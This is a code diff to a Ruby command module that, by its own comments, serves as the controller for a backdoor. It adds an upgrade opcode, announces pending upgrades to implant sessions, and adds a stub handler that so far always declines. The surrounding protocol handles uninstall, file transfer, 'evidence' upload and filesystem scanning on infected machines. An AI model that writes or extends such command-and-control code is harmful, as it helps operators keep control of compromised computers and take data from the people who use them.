@@ -29,6 +29,7 @@ module Commands
   PROTO_UNINSTALL  = 0x0a       # Uninstall command
   PROTO_DOWNLOAD   = 0x0c       # List of files to be downloaded
   PROTO_UPLOAD     = 0x0d       # A file to be saved
+  PROTO_UPGRADE    = 0x16       # Upgrade for the backdoor
   PROTO_EVIDENCE   = 0x09       # Upload of an evidence
   PROTO_FILESYSTEM = 0x19       # List of paths to be scanned
 
@@ -37,6 +38,7 @@ module Commands
              PROTO_UPLOAD => :command_upload,
              PROTO_DOWNLOAD => :command_download,
              PROTO_FILESYSTEM => :command_filesystem,
+             PROTO_UPGRADE => :command_upgrade,
              PROTO_EVIDENCE => :command_evidence,
              PROTO_BYE => :command_bye}
 
@@ -75,6 +77,10 @@ module Commands
     if DB.instance.new_conf? session[:bid] then
       available += [PROTO_CONF].pack('i')
       trace :info, "[#{peer}][#{session[:cookie]}] Available: New config"
+    end
+    if DB.instance.new_upgrade? session[:bid]
+      available += [PROTO_UPGRADE].pack('i')
+      trace :info, "[#{peer}][#{session[:cookie]}] Available: New upgrade"
     end
     if DB.instance.new_downloads? session[:bid] then
       available += [PROTO_DOWNLOAD].pack('i')
@@ -164,6 +170,18 @@ module Commands
 
       trace :info, "[#{peer}][#{session[:cookie]}] [#{upload[:filename]}][#{upload[:content].length}] sent (#{left} left)"
     end
+
+    return response
+  end
+
+    # Protocol Upgrade
+  # -> PROTO_UPGRADE
+  # <- PROTO_NO | PROTO_OK [ left, filename, content ]
+  def command_upgrade(peer, session, message)
+    trace :info, "[#{peer}][#{session[:cookie]}] Upgrade request"
+
+    trace :info, "[#{peer}][#{session[:cookie]}] NO upgrade"
+    response = [PROTO_NO].pack('i')
 
     return response
   end
